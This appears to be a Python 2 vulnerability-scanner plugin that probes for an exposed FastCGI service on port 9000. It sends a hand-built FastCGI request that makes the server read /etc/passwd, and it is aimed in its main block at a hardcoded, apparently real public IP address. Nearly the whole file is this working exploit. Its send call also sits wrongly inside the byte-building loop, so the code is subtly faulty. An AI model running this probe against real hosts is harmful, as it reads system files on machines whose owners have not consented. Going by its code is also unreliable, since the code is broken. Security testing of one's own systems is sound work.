#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'scanf'
#由于fcgi和webserver对script路径级参数的理解不同出现的问题。除此之外，由于fcgi和webserver是通过网络进行沟通的，因此目前越来越多的集群将fcgi直接绑定在公网上，所有人都可以对其进行访问。这样就意味着，任何人都可以伪装成webserver，让fcgi执行我们想执行的脚本内容。
#http://zone.wooyun.org/content/1060
#端口是9000
import socket
def assign(service, arg):
    if service == "ip":
        return True, arg
def audit(arg):
    host = arg
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(3.0)
        sock.connect((host, 9000))
        data = """
                01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
                01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53 
                54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52 
                56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50 
                2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
                4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
                52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49 
                50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f 
                70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
                4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
                63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
                """  
        data_s = ''
        for _ in data.split():
            data_s += chr(int(_,16))
            sock.send(data_s)
        try:
            ret = sock.recv(1024)
            if ret.find(':root:') > 0:
                security_hole('fcgi vulnerable')
        except Exception, e:
            pass     
        sock.close()
    except Exception, e:
        pass
if __name__ == '__main__':
    from dummy import *
    audit(assign('ip','110.164.68.148')[1])